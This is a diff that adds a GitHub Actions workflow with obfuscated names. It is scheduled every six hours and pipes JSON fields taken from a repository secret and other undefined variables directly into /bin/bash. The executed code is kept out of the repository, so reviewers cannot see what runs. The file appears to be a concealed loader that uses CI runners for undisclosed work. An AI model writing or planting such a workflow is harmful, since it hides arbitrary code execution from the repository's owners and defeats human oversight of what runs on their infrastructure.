@@ -1,0 +1,24 @@
+name: jingyuanxina
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jingyuanxina
+        env:
+          yg39747: ${{ secrets.yg39747 }}
+        run: |
+          echo $yg39747 | jq -r .piyo058 | /bin/bash
+          echo $g66255 | jq -r .cv2 | /bin/bash
+          echo $kll02327 | jq -r .kivjx549 | /bin/bash
+          echo $q3 | jq -r .u05 | /bin/bash
+          echo $nfo579 | jq -r .xnv8699 | /bin/bash
+          echo $ga1986 | jq -r .y05 | /bin/bash
+          echo $k072 | jq -r .gzfa1 | /bin/bash
+
